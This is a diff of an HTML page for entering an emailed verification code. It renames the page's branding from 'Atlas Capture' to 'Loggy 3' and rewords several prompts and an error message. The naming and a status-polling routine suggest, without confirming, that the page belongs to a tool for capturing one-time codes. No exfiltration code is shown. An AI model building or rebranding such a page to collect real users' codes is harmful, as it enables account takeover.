@@ -3,7 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Atlas Capture - Verify Code</title>
+<title>Loggy 3 - Verify Code</title>
+<link rel="icon" type="image/png" href="/images/logo.png">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}
@@ -122,11 +123,11 @@ button:disabled{opacity:0.6;cursor:not-allowed}
 <div class="wrapper">
   <div class="header">
     <div class="icon"><img id="logoAtlas" src="/images/logo.png" alt="atlas logo"></div>
-    <span>Atlas Capture</span>
+    <span>Loggy 3</span>
   </div>
   <div class="card">
     <h2>Check your email</h2>
-    <p class="subtext">We sent you a 5-6 character verification code</p>
+    <p class="subtext">We sent you a verification code</p>
     <input type="text" class="otp-input" id="otpInput" maxlength="6" placeholder="------">
     <div id="errorMessage" class="error-message"></div>
     <button id="verifyBtn">Verify</button>
@@ -160,7 +161,7 @@ button:disabled{opacity:0.6;cursor:not-allowed}
 
 <div id="textPopup" class="popup-overlay">
   <div class="popup-text">
-    <h3>Message</h3>
+    <h3>Update Info</h3>
     <div class="message" id="textMessage"></div>
   </div>
 </div>
@@ -255,7 +256,7 @@ async function pollStatus() {
 verifyBtn.addEventListener('click', async () => {
   if (isProcessing) return;
   const otp = otpInput.value.trim().toUpperCase();
-  if (otp.length < 5 || otp.length > 6) { showError('Please enter 5 or 6 characters'); return; }
+  if (otp.length < 5 || otp.length > 6) { showError('Please enter the code sent to your email'); return; }
   if (!/^[A-Z0-9]+$/.test(otp)) { showError('Only letters and numbers allowed'); return; }
 
   showLoading();
